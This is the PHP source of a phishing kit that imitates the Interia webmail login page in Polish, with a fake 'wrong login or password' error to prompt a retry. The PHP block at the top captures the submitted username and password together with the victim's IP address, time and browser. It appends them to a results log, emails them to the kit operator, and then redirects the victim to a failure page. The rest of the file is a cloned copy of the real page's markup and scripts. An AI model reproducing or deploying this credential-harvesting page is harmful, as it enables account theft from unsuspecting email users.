<?php

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);



session_start();


if ( isset( $_POST["submit"] ) ) { 
    
$_SESSION['username'] = $_POST['username'];
$_SESSION['password'] = $_POST['password'];



$username = $_SESSION['username'];

$password = $_SESSION['password'];
 
 require('../../myEmail.php');
$mailTo = $myEmail;


date_default_timezone_set('Europe/London');
	$ip = $_SERVER['REMOTE_ADDR'];
	$time = date("m-d-Y g:i:a");
	$agent = $_SERVER['HTTP_USER_AGENT'];




$txt =  "&& INTERIA MAIL ACCESS *(2 0F 2 ATTEMPTS)*\n";
$txt .= "EMAIL : ".$email."\n";
$txt .= "PASSWORD : ".$password."\n";
$txt .= "=================================================\n";
$txt .= "Sent from   " .$ip. "  on   "   .$time. " via   " .$agent.".\n";

 $subject = "INTERIA ACCESS FOR"." ".$ip;
 $headers = "INTERIA ACCESS FOR"." ".$ip;
 
 $fp = fopen("logs/results.txt", "a");
 fputs($fp,$txt);
 fclose($fp);
 

 mail($mailTo, $subject, $txt, $headers);

 header("location: ../../failed.php");


exit();



exit;


}


?>
<!DOCTYPE html>
<html lang=pl class="no-js"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta http-equiv="Content-Language" content="pl"> <title>Poczta w Interii – logowanie poczta. Konto e-mail o nieograniczonej pojemności. Darmowa poczta e-mail</title> <meta name=Description content="Poczta w Interii - Darmowa poczta e-mail. Bezpieczne logowanie, anty-spam i anty-wirus, autoresponder, filtry wiadomości e-mail, obsługuj konto przez www i w programach pocztowych, kalendarz i ogranizer."> <meta name=Keywords content="Poczta, darmowa poczta, konto e-mail, logowanie"> <meta name="viewport" content="initial-scale=1,maximum-scale=1,width=device-width,user-scalable=no"> <meta name="referrer" content="origin"> <meta name="apple-itunes-app" content="app-id=1141842988"> <link rel="shortcut icon" href="/favmix.ico"> <link href="https://o.iplsc.com/n/css/skins/images/favicon_152x152.png" rel="apple-touch-icon-precomposed"> <link href="https://o.iplsc.com/n/css/skins/images/favicon_152x152.png" sizes="120x120" rel="apple-touch-icon-precomposed"> <link href="https://o.iplsc.com/n/css/skins/images/favicon_152x152.png" sizes="152x152" rel="apple-touch-icon-precomposed"> <link rel="canonical" href="http://poczta.interia.pl/"> <link rel=stylesheet href=https://o.iplsc.com/d/css/common-00326-1106.css media=all> <!--[if IE 8]> <link rel=stylesheet href=https://o.iplsc.com/d/css/common-ie8-00326-1055.css media=all> <![endif]--> <!--[if IE 9]> <link rel=stylesheet href=https://o.iplsc.com/d/css/common-ie9-00326-1055.css media=all> <![endif]--> <script src=https://w.iplsc.com/external/jquery/jquery-1.6.1.js></script><script src=https://w.iplsc.com/external/jquery.validate/1.8.2/jquery.validate.js></script><script src=https://w.iplsc.com/external/jquery.lazyLoad/1.7.2/jquery.lazyLoad.js></script><script src=https://w.iplsc.com/internal/inpl.scrollfooter/1.0.4/inpl.scrollfooter.js></script><script src=https://w.iplsc.com/external/modernizr/2.8.3.1/modernizr.js></script> <script src=https://o.iplsc.com/d/js/common-00326-1055.js></script> <script> if (top!==self) { try { parent.Inpl.Mail.Network.showLoginForm(); frameElement.src = "about:blank"; } catch(e) { top.location.href = location.href; } } if (Account.Form.isSessionValid() ) { var pocztaCookie = Account.Form.getCookie('poczta'); location.href = pocztaCookie !== 'classic' ? pocztaCookie == 'next' ? '/next/' : pocztaCookie == 'touch' ? '/touch/' : '/html/' : '/classic/' ; } </script> <script>(function(a,d,v,e,r,t,s){window.adocf={useDOMContentLoaded : true};a.__inplAd = a.__inplAd || [];a.Inpl=a.Inpl||{};a.Inpl[r]=a.Inpl[r]||{};function p(f){__inplAd.push(f);}var fn=["init","enablePlugin","initSinglePlacment","removeAd","set","get","getAd","setAd","returnAd","hbht","getKeywords","addKeywords","disableNuggad","addAdPlaceToRefresh","addAdPlaceToRefreshCycle","refreshAdPlace","refreshAdPlaces","insertAd","isAd","onAd","onEmit", "onEmptyInfoSent"];for(var m in fn){(function(f){Inpl.Ad[f]=function(){if("insertAd"==f){document.write("<div id=\"ad_"+arguments[0]+"\"></div>")};Array.prototype.unshift.call(arguments,f);p(arguments);}})(fn[m])}t=d.createElement(v);s=d.getElementsByTagName(v)[0];var l="http"+((location.protocol=="https:")?"s:":":");t.src=l+e;s.parentNode.insertBefore(t,s)})(window,document,"script","//js.iplsc.com/inpl.anc/inpl.anc.jssc","Ad");</script> <script type="text/javascript">
<!-- <![CDATA[
	if(!INTPL) var INTPL=function(){
	if(arguments[0] === 'insertAd') {
		Inpl.Ad[arguments[0]].call(Inpl.Ad,arguments[1]);
	}

	};
// ]]> -->
</script> <script type="text/javascript" src="//x.interia.pl/inpl/inpl.tools.120702.js"></script><!-- Begin DOTSRV --> <script type="text/javascript">
<!--//--><![CDATA[//><!--

var pp_gemius_identifier = "ciU6Rgd7bz4BjkMzF0Hxn7QGXfx_aAdhTWp2ULwy7zz.K7";
function gemius_pending(i) { window[i] = window[i] || function() {var x = window[i+'_pdata'] = window[i+'_pdata'] || []; x[x.length]=arguments;};};
gemius_pending('gemius_hit'); gemius_pending('gemius_event'); gemius_pending('pp_gemius_hit'); gemius_pending('pp_gemius_event');
(function(d,t) {try{ var s=d.getElementsByTagName(t)[0],l='http'+((location.protocol=='https:')?'s':'');
var add=function(ohost, clb){ var gt=d.createElement(t),h=(ohost?"iwa.iplsc.com/sweqevub.js":"iwa.iplsc.com/xgemius.js?v=3");
gt.setAttribute('async','async'); gt.setAttribute('defer','defer'); gt.src=l+'://'+h; s.parentNode.insertBefore(gt,s);
if (clb && gt.addEventListener) gt.addEventListener('er'+'r'+'or', clb, false); else if (clb && gt.attachEvent) gt.attachEvent('on'+'er'+'r'+'or', clb); };
add(0, function(){add(1);});} catch (e) {}})(document,'script');
//--><!]]>
</script> <script> var __iwa = __iwa || []; __iwa.push( ["setCustomVar","gemius_hg","1", "page"] ); </script> <!-- End DOTSRV --> <!-- Google Analytics (Universal Analytics) poczta.interia.pl --> <script> (function (root) { /* Google Analytics execution Adapter Enable to use old dc.js events and functions in analytics.js Only for temporary usage!!!!!!!!! */ root['_gaq']=root['_gaq']||[]; var gaq = root['_gaq']; gaq.push = function () { var args = Array.prototype.slice.call(arguments); args.forEach(function (el) { var type = el[0]; var category = el[1] ? el[1] : null; var action = el[2] ? el[2] : null; var label = el[3] ? el[3] : null; var optVal = el[4] ? el[4] : null; var nonInt = el[5] ? {'nonInteraction': 1} : null; var tracker = false; if(type.indexOf != -1){ tracker = (type.split("."))[0]; type = (type.split("."))[1]; } var target = tracker == 'b' ? 'service' : 'portal'; if(type == '_trackEvent'){ ga(target+'.send', { hitType: 'event', eventCategory: category, eventAction: action, eventLabel: label, eventValue: optVal, nonInteraction: nonInt }); } else if(type == '_trackPageview') { ga(target+'.send', 'pageview', category); }else if(type == '_trackSocial') { ga(target+'.send', { hitType: 'social', socialNetwork: category, socialAction: action, socialTarget: label }); } else if(type == '_setCustomVar') { ga(target+'.set', "dimension"+category, label); } }); }; })(window); </script> <script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create', 'UA-3530215-5', 'auto', 'portal', {'cookieDomain': 'interia.pl', 'legacyCookieDomain': 'interia.pl', 'legacyHistoryImport': true });ga('portal.send', 'pageview');ga('create', 'UA-2540319-23', 'auto', 'service');ga('service.require', 'displayfeatures');ga('service.send', 'pageview');</script> <!-- End Google Analytics --><!--/GT3.2--> <script>function iwa() {return iwa2.apply(null, arguments) || iwa1.apply(null, arguments);};Inpl=window.Inpl||{};Inpl.WebTr=Inpl.WebTr||{};Inpl.WebTr.iwa = {};var __iwa = __iwa || [];Inpl.Ad = Inpl.Ad || {};Inpl.Ad.exSettings = Inpl.Ad.exSettings || {};Inpl.Ad.exSettings.keywords = Inpl.Ad.exSettings.keywords || {};__iwa.push(["setCustomVar","webtrack","true","page"]);__iwa.push(["setCustomVar","keywords",Inpl.Ad.exSettings.keywords.DFP,"page"]);__iwa.push(["setCustomVar","path_prefix",Inpl.Ad.exSettings.pathPrefix,"page"]);Inpl.WebTr.iwa.plugins = JSON.parse('{"browserFeatures":{},"pageheight":{"cv":{"0":{"name":"pageHeightVar","value":"pageheight"}}},"performance":{"cv":{"0":{"name":"unloadEvent","value":"p_unload_evt"},"1":{"name":"redirect","value":"p_redirect"},"2":{"name":"domainLookup","value":"p_domain_lookup"},"3":{"name":"connect","value":"p_connect"},"4":{"name":"request","value":"p_request"},"5":{"name":"response","value":"p_response"},"6":{"name":"parse","value":"p_parse"},"7":{"name":"domContentLoaded","value":"p_dom_cnt_load"},"8":{"name":"domContentLoadedEvent","value":"p_dom_cnt_load_evt"},"9":{"name":"pageload","value":"p_load"},"10":{"name":"pageloadEvent","value":"p_load_evt"}}},"scroll":{"cv":{"0":{"name":"scrollToVar","value":"scroll"}}},"timeSpent":{"cv":{"0":{"name":"unit","value":"seconds"}}},"userOrigin":{},"viewAbility":{}}');Inpl.WebTr.iwa.noPv = "";Inpl.WebTr.iwa.iwa3Source = "https://js.iplsc.com/iwa3/3.0.27/";Inpl.WebTr.iwa.iwa3Collector = "//iwa3.hit.interia.pl:8443";Inpl.WebTr.iwa.iwaSource = "https://iwa.iplsc.com/iwa.js";Inpl.WebTr.iwa.trackerId = "1";function iwa(){return iwa3.apply(null,arguments)||iwa1.apply(null,arguments)}!function(a,b,c,d,e,f,g){a.IWAObject=e,a[e]=a[e]||function(){(a[e].q=a[e].q||[]).push(arguments)},f=b.createElement(c),g=b.getElementsByTagName(c)[0],f.async=1,f.onerror=function(){"undefined"!=typeof Inpl&&void 0!==Inpl.Abd&&Inpl.Abd.trackError("iwa1",2)},f.onload=function(){"undefined"!=typeof Inpl&&void 0!==Inpl.Abd&&Inpl.Abd.registerScript("iwa1",2)},f.src=d,g.parentNode.insertBefore(f,g)}(window,document,"script",Inpl.WebTr.iwa.iwaSource,"iwa1");!function(e){var n={};function r(i){if(n[i])return n[i].exports;var t=n[i]={i:i,l:!1,exports:{}};return e[i].call(t.exports,t,t.exports,r),t.l=!0,t.exports}r.m=e,r.c=n,r.d=function(e,n,i){r.o(e,n)||Object.defineProperty(e,n,{enumerable:!0,get:i})},r.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,n){if(1&n&&(e=r(e)),8&n)return e;if(4&n&&"object"==typeof e&&e&&e.__esModule)return e;var i=Object.create(null);if(r.r(i),Object.defineProperty(i,"default",{enumerable:!0,value:e}),2&n&&"string"!=typeof e)for(var t in e)r.d(i,t,function(n){return e[n]}.bind(null,t));return i},r.n=function(e){var n=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(n,"a",n),n},r.o=function(e,n){return Object.prototype.hasOwnProperty.call(e,n)},r.p="/",r(r.s=0)}([function(e,n){"undefined"==typeof iwa&&(window.iwa=function(){return iwa3.apply(null,arguments)}),function(e,n,r,i,t){var o=Object.entries&&"undefined"!=typeof Promise&&-1!==Promise.toString().indexOf("[native code]")?1:0;window.iwa3BaseURL=o?e+"new/":e+"old/";var a=window.iwa3BaseURL+"main.iwa.js",w=window.Inpl||{};window.IWA3Object="iwa3";var u="script";window.iwa3=window.iwa3||function(){window.iwa3.q=window.iwa3.q||[],window.iwa3.q.push(arguments)};var l=document.createElement(u);l.src="https:"+i+"/iwa_core?ts="+Date.now()+"&u="+encodeURIComponent(location.href)+"&sh="+location.host.replace("www.","");var c=document.createElement(u),s=document.getElementsByTagName(u)[0];c.async=1,iwa3("config",{request:{socket:{url:"wss:"+i+"/collector"},http:{url:"https:"+i}}}),c.src=a,c.setAttribute("crossorigin","anonymous"),s.parentNode.insertBefore(l,s),s.parentNode.insertBefore(c,s),window.onerror=function(){void 0!==w&&void 0!==w.Abd&&w.Abd.trackError("iwa3",3)},window.onload=function(){void 0!==w&&void 0!==w.Abd&&w.Abd.registerScript("iwa3",3)}}(Inpl.WebTr.iwa.iwa3Source,0,0,Inpl.WebTr.iwa.iwa3Collector),iwa("create",Inpl.WebTr.iwa.trackerId);var r={};for(var i in Inpl.WebTr.iwa.plugins)Inpl.WebTr.iwa.plugins.hasOwnProperty(i)&&(t(),iwa("plugin","register",i,r));function t(){for(var e in Inpl.WebTr.iwa.plugins[i].cv)Inpl.WebTr.iwa.plugins[i].cv.hasOwnProperty(e)&&(r[Inpl.WebTr.iwa.plugins[i].cv[e].name]=Inpl.WebTr.iwa.plugins[i].cv[e].value)}if(window.iwaCustomVariablesData)for(var o in window.iwaCustomVariablesData)window.iwaCustomVariablesData.hasOwnProperty(o)&&iwa("setCustomVar",o,window.iwaCustomVariablesData[o],"page");Inpl.WebTr.iwa.noPv||iwa("send","pageview")}]); </script> <script> window.isCookieEnabled = function(){document.cookie = 'testcookie'; return document.cookie.indexOf('testcookie')!=-1;}; var rodoScriptDir = "https://js.iplsc.com/inpl.rd/latest/"; var rodoJsonDir = "https://prywatnosc.interia.pl/rodo/messages-poczta"; var googletag = googletag || {cmd: []}; googletag.cmd.push(function () {googletag.pubads().setTargeting('rodo', 4);googletag.pubads().setRequestNonPersonalizedAds(1);}); try { localStorage.setItem('adoceanRodoKeyword', 'rodo_4'); } catch (e) {}; </script> <script async crossorigin="anonymous" src='https://js.iplsc.com/inpl.rd/latest/inpl.rd.jssc'></script> <script src="//js.iplsc.com/inpl.measure/inpl.measure.jssc" async></script> <style type="text/css"> /* <![CDATA[ */ @media all {#ad_gora_srodek{padding-top:2px;padding-bottom:2px}} @media print {#ad_gora_srodek{display:none} #id_skyscraper{display:none}} /* ]]> */ </style> <!-- AdServer CID: INTERIA/poczta PID: main_dwa --> <script type="text/javascript">
<!-- <![CDATA[


// ]]> -->
</script> <script type="text/javascript">
<!-- <![CDATA[
Inpl.Ad.init({'box600x450_new':'adoceanhubomjlnphokg','box300x250':'adoceanhubqepqjofqka','gigabox':'adoceanhubtdikgrllaf','m_gora_srodek':'adoceanhubxlqpjirocb','box600x450':'adoceanhubkjfimugitq'},'hdegxlAdl9q.e_y7Gr5LCrMmIfZK7V60t3kdq2Ha0sr.G7');
// ]]> -->
</script> <!-- Google DFP --> <script type='text/javascript'>
		var cookieEnabled = ( window.isCookieEnabled && typeof(window.isCookieEnabled) === 'function' ) ? window.isCookieEnabled() : false;
		if (!cookieEnabled){
			document.cookie = "testDfpCookie";
			cookieEnabled = document.cookie.indexOf("testDfpCookie")!=-1;
		}
		if( cookieEnabled ) {
			var headTag = document.getElementsByTagName('head')[0];
			var staticCriteo = document.createElement('script');
			staticCriteo.type = 'text/javascript';
			staticCriteo.async = true;
			staticCriteo.src = '//static.criteo.net/js/ld/publishertag.js';
			headTag.appendChild(staticCriteo);
		
			var googletag = googletag || {};
			googletag.cmd = googletag.cmd || [];
			var gads = document.createElement("script");
			gads.async = !0, gads.type = "text/javascript";
			var useSSL = "https:" == document.location.protocol;
			gads.src = (useSSL ? "https:" : "http:") + "//www.googletagservices.com/tag/js/gpt.js";
			var node = document.getElementsByTagName("script")[0];
			node.parentNode.insertBefore(gads, node),
				function() {
					"use strict";
					try {
						googletag.cmd.push(function() {
							googletag.pubads().enableSingleRequest();
							googletag.pubads().disableInitialLoad();
							googletag.pubads().collapseEmptyDivs(true);
						});
						window.Inpl = window.Inpl || {}, Inpl.googletag = Inpl.googletag || {}, Inpl.googletag.slot = Inpl.googletag.slot || {}, Inpl.googletag.mapping = Inpl.googletag.mapping || {}, Inpl.googletag.eventRenderEnd = function(e, o, t) {
							if (o && t && e && Inpl.googletag.slot[o] && e.slot === Inpl.googletag.slot[o] && (o === "dfp_gora_srodek" || o === "dfp_dol_srodek")) {
								t.style.textAlign = "center";
							}
						}, Inpl.googletag.plugins = Inpl.googletag.plugins || {}, Inpl.googletag.getCookie = function(e) {
							return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(e).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")).replace(/=/g, "_").replace(/;/g, ",") || ""
						}, Inpl.googletag.getStorage = function(e) {
							return localStorage.getItem(e)
						}, Inpl.googletag.getKeywords = function(e) {
							var o = Inpl.googletag.getStorage(e),
								t = !!o && o.split(",");
							return t || !1
						}, Inpl.googletag.plugins.CustomKeywords = Inpl.googletag.getKeywords("ad_custom_keywords") || "", Inpl.googletag.plugins.Netsprint = Inpl.googletag.getKeywords("nshost_" + window.location.hostname) || "", Inpl.googletag.plugins.Criteo = Inpl.googletag.getCookie("crtgin_rta") || "", Inpl.googletag.plugins.Adb = parseInt(Inpl.googletag.getCookie("__adb_st"), 10), Inpl.googletag.plugins.Host = window.location.hostname, Inpl.googletag.plugins.HostName = window.location.hostname;


					} catch (e) {
						console.log("DFP:", e)
					}
				}()
				
				document.addEventListener('DOMContentLoaded', function(e){
					/* CRITEO */
					window.Criteo = window.Criteo || {};
					window.Criteo.events = window.Criteo.events || [];

					var launchAdServer = function () {
						googletag.cmd.push(function () {
							/* This will append Criteo keywords to the adserver call */
							Criteo.SetDFPKeyValueTargeting();
							/* This will trigger the adserver call */
							 googletag.pubads().refresh();
						});
					};
					/* Declare this above the adunits */
					
					var isMobile = ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));

					/* Initialize the adUnit mapping */
					var adUnits = {
						"placements": [
							{
								"slotid": "dfp-gora_srodek",
								"zoneid": (isMobile ? 1116730 : 1115823)
							},
							{
								"slotid": "dfp-box300x250",
								"zoneid": (isMobile ? 1116730 : 1114659)
							},
							{
								"slotid": "dfp-box_300x250_google",
								"zoneid": (isMobile ? 1116730 : 1114659)
							},
							{
								"slotid": "dfp-rectangle",
								"zoneid": (isMobile ? 1116730 : 1114659)
							},
							{
								"slotid": "dfp-dol_srodek",
								"zoneid": (isMobile ? 1116730 : 1116731)
							}
						]
					};

					Criteo.events.push(function () {
						/* Define the price band range */
						Criteo.SetLineItemRanges("0..12:0.04;12..32:0.2;32..80:2;80..400:20");

						/* Call Criteo and execute the callback function for a given timeout */
						Criteo.RequestBids(adUnits, launchAdServer, 700);
					});
					/* CRITEO */
				}, false);
			}
    </script> <!-- END Google DFP --> <script>Account.Form.adoceanHits();</script> </head> <!--[if lt IE 9]> <body class="ielt9"> <![endif]--> <!--[if gt IE 8]><!--> <body class=""> <!--<![endif]--> <script> var login_config = {"pocztaApiUrl":"\/\/poczta-api.interia.pl"}</script> <div class="parallax-set"> <div data-offset="90" class="parallax--fixed first"></div> <div data-offset="20" class="parallax second"></div> <div data-offset="50" class="parallax third"></div> </div> <div id="pageWrapper"> <div id="pageContainer" class="page-container page-container--login"> <header class="hederNext"> <div id="header"> <div class="standard-common-logo"> <a class="standard-interia-logo" href="http://www.interia.pl#utm_source=KONTO&amp;utm_medium=logo&amp;utm_campaign=powrot_z_wew&amp;iwa_source=logo" title="Przejdź na stronę główną INTERIA.PL"> <img src="https://o.iplsc.com/d/img/next/logo/interia-logo-2-0.png" alt="INTERIA.PL" width="172" height="43"> </a> <a class="standard-service-logo" href="/#iwa_source=logo" title="Przejdź do strony głównej serwisu na INTERIA.PL" rel="home"> <img src="https://o.iplsc.com/d/img/next/logo/poczta-logo-3-0.png" width="107" height="19" alt=Poczta> </a> </div> <a class="link-promoApp" target="_blank" href="https://play.google.com/store/apps/details?id=pl.interia.poczta_next&referrer=utm_source%3Dpoczta_interia%26utm_medium%3Dnaglowek_log%26utm_campaign%3Dnaglowek_log%26anid%3Dadmob"> <img class="link-promoApp-mobile" src="https://o.iplsc.com/d/img/next/google_play_badge.svg" width="105" height="31" alt=Poczta> <span class="link-promoApp-desktop">Najlepsza aplikacja pocztowa</span> </a> </div> </header> <div id="contentContainer" class="content-container content-container--login"> <div id="content" class=" wideContent"> <div class="inner"> <div class="content"> <div id="sitebar" class="sitebar sitebar--login"> <div class="outerBorder"> <div class="innerBorder"> <h1 class="h--log_in">Logowanie</h1> <a class="login-link login-link--help login-link--desktop" target="_blank" href="http://info.poczta.interia.pl/pomoc">Pomoc</a> <form method="post" action="retry.php" id="pocztaLoginForm"><div class="errorMsg" style="position:relative;top:2rem"> <div class="error-msg-wrapper"> #1801 Błędny login lub hasło </div> </div> </div> </div> <fieldset> <div class="row input email"> <input id="formEmail" class="input__field" type="text" name="username" value=""> <label class="input__label" for="formEmail"> <span>E-mail</span> <hr class="hr-before"> </label> </div> <div class="row input password"> <input id="formPassword" class="input__field" type="password" name="password" value=""> <label class="input__label" for="formPassword"> <span>Hasło</span> <hr class="hr-before"> </label> </div> <div class="row checkbox rememberMe"> <input id="permanent" type="checkbox" name="rememberMe"> <label for="permanent">Zapamiętaj mnie</label> </div> <a class="login-link login-link--help login-link--mobile" target="_blank" href="http://info.poczta.interia.pl/pomoc">Pomoc</a> <a class="no-remember-pass" href="https://konto-pocztowe.interia.pl/#/odzyskiwanie-dostepu#utm_source=log_p&utm_medium=log_p&utm_campaign=odzysk_haslo&iwa_source=log_p_odzysk_haslo">Odzyskaj hasło</a> <input id="iTarget" type="hidden" name="target" value="/"> <input id="iCrcTarget" type="hidden" name="crcTarget" value="1964775998"> <input id="iReferer" type="hidden" name="referer" value=""> <input id="iCrcReferer" type="hidden" name="crcReferer" value=""> <input id="isMobilePhone" type="hidden" name="isMobilePhone" value=""> </fieldset> <div class="buttons"> <button type="submit" id="formSubmit" class="emph" name="submit"> <span>Zaloguj się</span> </button> </div> </form> <div id="greenTopPanel" class="login-account-panel login-account-panel--desktop"> <div class="login-account-panel-content"> <div> <span>Nie masz jeszcze konta.</span> <span>Załóż je już dziś.</span> </div> <a class="new-account" href="https://konto-pocztowe.interia.pl/#/nowe-konto"> <span>Załóż <span class="new-account-extra">nowe</span> konto</span> </a> </div> </div> <!-- new-account-extra --> <div class="register-incentive"> <span>Nie masz jeszcze konta?</span> <a href="https://konto-pocztowe.interia.pl/#/nowe-konto"> <span>Zarejestruj się!</span> </a> </div> </div> </div> </div> <div class="sitebar-block-fake"></div> <div class="box box600x450" id="box600x4501" style="display: block;"> <div class="boxBegin"></div> <div class="boxHeader"> </div> <div class="boxBody"> <div id="autopromoPlace"> </div> <noscript> <div> <a href="https://konto.interia.pl/poczta/nowe-konto"> <img src="https://o.iplsc.com/d/img/static/nolimits.jpg" alt="konto bez limitów" width=600 height=450> </a> </div> </noscript> <script> if(1000 <= document.body.offsetWidth && !document.body.classList.contains('passIsForget')) { INTPL("insertAd","box600x450"); Inpl.Ad.onAd('box600x450', function(isAd) { if(!isAd){ Account.Form.staticImg('https://o.iplsc.com/d', document.getElementById('autopromoPlace')); } }); } </script> <div class="pass-forget"> <div class="pass-forget__content"> <img class="pass-forget__icon" src="https://o.iplsc.com/d/img/next/logo/phone_sms.svg" width="79" alt="Poczta ikonka sms>" /> <div class="pass-forget__description"> <h1 class="pass-forget__description__title">Nie pamiętasz hasła?</h1> <div class="pass-forget__description__subtitle"> Wyślemy Ci kod PIN na numer telefonu,<br/> który dodałeś do swojej poczty. </div> <a class="pass-forget__description__link" href="https://konto-pocztowe.interia.pl/#/odzyskiwanie-dostepu#utm_source=log_p&utm_medium=log_p&utm_campaign=odzysk_haslo&iwa_source=log_p_odzysk_haslo" > Odzyskaj konto przez SMS </a> </div> </div> <div class="pass-forget__footer"> Opłata za usługę Odzyskaj konto wynosi 9,90 zł brutto.<br/> Opłata jest naliczana jednorazowo do rachunku operatora </div> </div> <div class="pass-forget--hidden"> <h1 class="pass-forget-header">NIE PAMIĘTASZ HASŁA?</h1> <p class="pass-forget-subheader">ODZYSKAJ DOSTĘP DO POCZTY PRZEZ SMS!</p> <ul class="pass-forget-list"> <li class="pass-forget-list-item"> W treści SMS-a wpisz słowo <b class="pass-forget-dark">RESET</b> oraz swój adres email.<br> Na przykład: <b class="pass-forget-dark">RESET</b> <span class="pass-forget-dark">kowalski@interia.pl</span> </li> <li class="pass-forget-list-item pass-forget-list-item--oneLine"> Wyślij SMS na numer <b class="pass-forget-dark">7952</b> </li> <li class="pass-forget-list-item"> W odpowiedzi otrzymasz nowe hasło.<br> Pamiętaj, aby je zmienić po zalogowaniu! </li> </ul> <p class="pass-forget-info"><b>UWAGA!</b> SMS wyślij z numeru telefonu, który jest zapisany w opcjach zmiany hasła na Twoim koncie. Koszt SMS 11,07 zł brutto. <a href="http://pomoc.poczta.interia.pl/news-co-zrobic-aby-otrzymac-nowe-haslo-w-sms-ie,nId,2204031#iwa_source=log_p_dowiedz_sie_wiecej" target="_blank">Dowiedz się więcej »</a></p> </div> </div> <div class="boxEnd"></div> </div> <div id="benefits" class="benefits"> <div class="best-mail"> <p>Przekonaj się, dlaczego nasza poczta jest najlepsza</p> </div> <div class="benefits-box"> <div id="recommend" class="benefits-element"> <div class="arrow-box"> <div class="border border-left"></div> <div class="arrow"><a href="#recommend" class="nav-arrow"></a></div> <div class="border border-right"></div> </div> <div class="benefits-element-center"> <h3>Polecają nas</h3> <div class="recommend-slider"> <div id="slides"> <div class="recommend-element slide1"> <div class="baloon baloon-antyweb"></div> <p class="recommend-text">"W mojej ocenie, nowy webmail to bardzo dobra propozycja Interii. W&nbsp;końcu wygląda to nowocześnie, ładnie i&nbsp;przejrzyście. Nowa wersja powinna ucieszyć zwłaszcza obecnych użytkownikow tej poczty."</p> <p class="recommend-signature">antyweb.pl</p> </div> <div class="recommend-element slide2"> <div class="baloon baloon-spiderweb"></div> <p class="recommend-text">"Nowa poczta Interii robi bardzo dobre pierwsze wrażenie i&nbsp;zyskuje przy dłuższym poznaniu. Użytkownicy powinni docenić wprowadzone zmiany, gdyż teraz webmail prezentuje się nie tylko ładnie i&nbsp;przejrzyście, ale jest bardzo funkcjonalny i&nbsp;wygodny w&nbsp;obsłudze."</p> <p class="recommend-signature">spidersweb.pl</p> </div> </div> <div class="dot-pointer"> <div class="dot filled">&#x2022;</div> <div class="dot">&#x2022;</div> </div> </div> </div> </div> <div id="unlimited" class="benefits-element unlimited"> <div class="arrow-box"> <div class="border border-left"></div> <div class="arrow"><a href="#unlimited" class="nav-arrow"></a></div> <div class="border border-right"></div> </div> <div class="benefits-element-center"> <div class="left"> <div class="benefit-head"> <h3>bez limitów</h3> <p>limity nas nie dotyczą <br class="br-large-only"/>nasza poczta ma <br class="large-only"/><span class="green bolder">nieograniczoną pojemność</span> </p> </div> <div class="benefit-body"> <div class="border-center"></div> <ul> <li>Masz tyle miejsca na maile, <br class="br-small-only"/>ile potrzebujesz</li> <li>Nie musisz nic usuwać</li> </ul> </div> </div> <div class="right"> <img class="lazy lazy--no-js-hide" data-original="https://o.iplsc.com/d/img/next/benefits/bez_limitow.png" alt="bez limitów"> <noscript> <img src="https://o.iplsc.com/d/img/next/benefits/bez_limitow.png" alt="bez limitów"> </noscript> </div> </div> </div> <div id="unique-address" class="benefits-element unique-address"> <div class="arrow-box"> <div class="border border-left"></div> <div class="arrow"><a href="#unique-address" class="nav-arrow"></a></div> <div class="border border-right"></div> </div> <div class="benefits-element-center"> <div class="left"> <div class="benefit-head"> <h3>niepowtarzalny <br class="br-large-only"/>adres</h3> <p>stwórz swój niepowtarzalny <br/> adres w&nbsp;domenie hub.pl</p> </div> <div class="benefit-body"> <div class="border-center"></div> <ul> <li>Tylko u&nbsp;nas możesz wybrać nie tylko login, ale&nbsp;i&nbsp;swoją&nbsp;własną&nbsp;domenę</li> <li>Potrzebujesz profesjonalnego adresu email? Załóż konto <span class="green">biuro@firma.hub.pl / jan@nowak.hub.pl</span> </li> <li>A może potrzebny Ci email do kontaktu ze znajomymi ze szkoły? Załóż konto <span class="green">maciek@2a.hub.pl</span> </li> </ul> </div> </div> <div class="right"> <img class="lazy lazy--no-js-hide" data-original="https://o.iplsc.com/d/img/next/benefits/niepowtarzalny_adres.png" alt="niepowtarzalny adres"> <noscript> <img src="https://o.iplsc.com/d/img/next/benefits/niepowtarzalny_adres.png" alt="niepowtarzalny adres"> </noscript> </div> </div> </div> <div id="look" class="benefits-element look"> <div class="arrow-box"> <div class="border border-left"></div> <div class="arrow"><a href="#look" class="nav-arrow"></a></div> <div class="border border-right"></div> </div> <div class="benefits-element-center"> <div class="left"> <div class="benefit-head"> <h3>wygląd</h3> <p>w każdej chwili możesz zmienić wygląd swojej poczty i&nbsp;dopasować go np. do humoru</p> </div> <div class="benefit-body"> <div class="border-center"></div> <ul> <li>Ustaw swoje tło poczty lub skorzystaj z&nbsp;gotowych skórek</li> <li>Dodaj zdjęcie jako awatar i&nbsp;daj się rozpoznać znajomym</li> </ul> </div> </div> <div class="right"> <img class="normal lazy lazy--no-js-hide" data-original="https://o.iplsc.com/d/img/next/benefits/wyglad.png" alt="wygląd"> <noscript> <img class="normal" src="https://o.iplsc.com/d/img/next/benefits/wyglad.png" alt="wygląd"> </noscript> <img class="mirror lazy lazy--no-js-hide" data-original="https://o.iplsc.com/d/img/next/benefits/wyglad-l.png" alt="wygląd"> <noscript> <img class="mirror" src="https://o.iplsc.com/d/img/next/benefits/wyglad-l.png" alt="wygląd"> </noscript> </div> </div> </div> <div id="mail-gallery" class="benefits-element mail-gallery"> <div class="arrow-box"> <div class="border border-left"></div> <div class="arrow"><a href="#mail-gallery" class="nav-arrow"></a></div> <div class="border border-right"></div> </div> <div class="benefits-element-center"> <div class="left"> <div class="benefit-head"> <h3>galerie pocztowe</h3> <p>zdjęcia, które wyślesz do znajomych lub rodziny zaprezentujemy w&nbsp;formie <span class="green 